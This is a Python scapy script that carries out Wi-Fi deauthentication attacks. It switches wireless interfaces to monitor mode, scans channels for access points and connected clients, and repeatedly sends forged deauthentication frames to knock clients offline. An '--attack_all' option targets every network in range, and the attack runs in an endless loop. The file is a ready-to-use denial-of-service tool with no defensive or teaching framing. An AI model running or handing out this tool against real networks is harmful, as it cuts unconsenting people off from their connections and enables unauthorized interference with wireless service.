import argparse
import random
import time
from scapy.all import *

# Constants
DEAUTH_PACKET_COUNT = 64
INTERFACE_MONITOR_1 = "wlan1"
INTERFACE_MONITOR_2 = "wlan2"

# Initialize arguments
parser = argparse.ArgumentParser(
    description="Deauth unwanted users from Wi-Fi network."
)
parser.add_argument("--death_reasons", nargs="+", type=int, default=[1])
parser.add_argument("--death_seq", type=int, default=1)
parser.add_argument("--whitelist_ap", nargs="+", default=[])
parser.add_argument("--whitelist_client", nargs="+", default=[])
parser.add_argument("--blacklist_ap", nargs="+", default=[])
parser.add_argument("--blacklist_client", nargs="+", default=[])
parser.add_argument("--attack_all", action="store_true")
parser.add_argument("--channel_list", nargs="+", type=int, required=True)
parser.add_argument("--channel_wait", type=int, default=1)
args = parser.parse_args()


# Utility function to convert channel to frequency
def channel_to_freq(channel):
    return 2407 + channel * 5


# Function to set monitor mode and channel
def set_monitor_mode(interface, channel):
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"iwconfig {interface} channel {channel}")
    os.system(f"ifconfig {interface} up")


# Function to create deauth packet
def create_deauth_packet(src, dst, bssid, reason):
    dot11 = Dot11(addr1=dst, addr2=src, addr3=bssid)  # To DS (addr1)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=reason)
    return packet


# Function to send deauth packets
def send_deauth_packets(interface, target, bssid, reason):
    packet = create_deauth_packet(src=target, dst=bssid, bssid=bssid, reason=reason)
    sendp(packet, iface=interface, count=args.death_seq, inter=0.1, verbose=0)


# Scanning networks
def scan_networks(channel):
    ap_list = []
    client_list = []

    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            if pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
                ssid = pkt[Dot11Elt].info.decode()
                bssid = pkt[Dot11].addr2.lower()
                ap_list.append((ssid, bssid))
            elif pkt.type == 2:  # Data frames
                bssid = pkt[Dot11].addr3
                client = (
                    pkt[Dot11].addr1 if pkt[Dot11].addr1 != bssid else pkt[Dot11].addr2
                )
                if client and ":" in client:
                    client_list.append(client.lower())

    sniff(iface=INTERFACE_MONITOR_1, prn=packet_handler, timeout=10)
    return ap_list, client_list


# Deauth process
def deauth_process():
    for channel in args.channel_list:
        set_monitor_mode(INTERFACE_MONITOR_1, channel)
        set_monitor_mode(INTERFACE_MONITOR_2, channel)

        ap_list, client_list = scan_networks(channel)

        for ssid, bssid in ap_list:
            if (bssid in args.whitelist_ap) or (ssid in args.whitelist_ap):
                continue
            if args.attack_all or (
                bssid in args.blacklist_ap or ssid in args.blacklist_ap
            ):
                for client in client_list:
                    if client in args.whitelist_client:
                        continue
                    if args.attack_all or client in args.blacklist_client:
                        for reason in args.death_reasons:
                            send_deauth_packets(
                                INTERFACE_MONITOR_2,
                                target=client,
                                bssid=bssid,
                                reason=reason,
                            )

        # Wait before hopping to the next channel
        time.sleep(args.channel_wait)


def main():
    while True:
        deauth_process()


if __name__ == "__main__":
    main()
